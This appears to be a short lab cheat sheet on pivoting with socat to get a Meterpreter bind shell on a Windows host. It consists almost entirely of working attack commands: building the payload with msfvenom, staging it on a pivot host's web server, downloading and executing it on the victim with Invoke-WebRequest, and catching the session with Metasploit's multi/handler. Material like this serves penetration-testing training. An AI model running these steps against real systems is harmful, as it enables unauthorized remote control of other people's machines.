# Socat Redirection with Bind Shell

## Socat Listener on Pivot Host

```sh
ubuntu@WEB01:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

## Creating the Payload

```sh
my@attack:~$ msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=8443 -f exe -o shell.exe
```

## Payload Transfer

### Uploading

```sh
my@attack:~$ scp shell.exe ubuntu@10.129.15.50:/tmp
```

### Web Server on Pivot Host

```sh
ubuntu@WEB01:~$ python3 -m http.server 8123 -d /tmp
```

### Downloading

```pwsh
PS C:\Users\victor> Invoke-WebRequest -Uri "http://172.16.5.129:8123/shell.exe" -OutFile "shell.exe"
```

### Executing

```pwsh
PS C:\Users\victor> .\shell.exe
```

## Configuring the Handler

```sh
my@attack:~$ msfconsole -q
```

```sh
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > set RHOST 10.129.15.50
msf6 exploit(multi/handler) > run
```

## Meterpreter Session Established

```sh
meterpreter > getuid
```

```output title="Output"
Server username: INLANEFREIGHT\victor
```
